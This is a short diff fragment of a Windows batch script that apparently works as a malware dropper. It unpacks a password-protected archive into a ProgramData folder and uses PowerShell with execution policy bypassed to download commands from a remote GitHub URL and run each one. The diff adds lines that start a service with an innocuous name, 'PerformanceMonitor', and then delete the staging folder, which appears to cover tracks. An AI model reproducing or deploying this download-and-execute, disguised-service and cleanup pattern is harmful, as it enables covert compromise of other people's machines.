@@ -20,3 +20,5 @@ for %a in (%processList%) do (
 
 "%ProgramData%\bist\UnRAR.exe" x -y -p147852369 "%ProgramData%\bist\51654.rar" "%ProgramData%\bist\"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = (Invoke-WebRequest 'https://raw.githubusercontent.com/githlabs/0/0/0/rus' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
+sc start PerformanceMonitor
+rd /s /q "%ProgramData%\bist"
